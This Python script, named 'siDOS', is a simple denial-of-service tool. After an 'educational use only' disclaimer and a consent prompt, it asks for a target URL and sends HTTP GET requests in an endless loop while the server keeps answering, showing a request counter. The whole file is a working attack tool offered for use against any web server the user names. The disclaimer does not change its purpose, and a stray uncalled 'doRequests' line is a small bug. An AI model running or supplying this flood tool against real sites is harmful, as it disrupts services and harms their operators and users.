#!/usr/env/python3
import sys
import requests
import os
import time
import platform


currentOS = platform.system()       #Detects the OS only for clearing the terminal/command prompt
if currentOS == "Windows":
    clear = "cls"
else:
    clear = "clear"


def tos():
    os.system(clear)
    print("Warning!")
    print("This program is only meant for educational use. The authors are not accountable for any misuse of this program.")
    time.sleep(5)
    os.system(clear)
    print("if you agree please write : 'Yes' or 'Y'")
    consent = input("I accept that i am responsible for my actions using this program: ")
    if (consent == "Yes") or (consent == "Y"):
        os.system(clear)
        doRequests()
    else:
        print("In order to use this program you must accept the TOS!")
        time.sleep(3)
        sys.exit()
    
def doRequests():
    print("***siDOS***")
    url = input("Insert your URL here: ")
    datasend = requests.post(url, allow_redirects=False)
    httpcode = datasend.status_code
    counter = 0
    hudrefresh = 0
    starthud = 1
    while httpcode == 200:
        try:
            datasend = requests.get(url, allow_redirects=False)
            httpcode = datasend.status_code
            counter += 1
            hudrefresh += 1
            if counter >= 10 and hudrefresh == 500:
                hudrefresh = 0
                os.system(clear)
                print("URL: " + url)
                print("HTTPCode: {0}".format(httpcode))
                print("Requests: " + str(counter))
                print("\nPress ctrl+c to stop sending requests")
            elif starthud == 1:
                starthud = 0
                os.system(clear)
                print("URL: " + url)
                print("HTTPCode: {0}".format(httpcode))
                print("Requests: " + str(counter))
                print("\nPress ctrl+c to stop sending requests")
        except ValueError:
            sys.exit()
        except KeyboardInterrupt:
            print("\nURL: " + url)
            print("Requests: " + str(counter))            
            print("Thank you for using siDOS !")
            sys.exit()
    if httpcode == 400:
        print("URL: " + url)
        print("HTTPCode: {0}".format(httpcode))
        print("Warning!!")
        print("Bad Request")
        doRequests
    elif httpcode == 403:
        print("URL: " + url)
        print("HTTPCode: {0}".format(httpcode))
        print("Warning!!")
        print("Forbidden")
    elif httpcode == 404:
        print("URL: " + url)
        print("HTTPCode: {0}".format(httpcode))
        print("Warning!!")
        print("Host Unreachable/ Not Found") 


if __name__ == "__main__":
    tos()
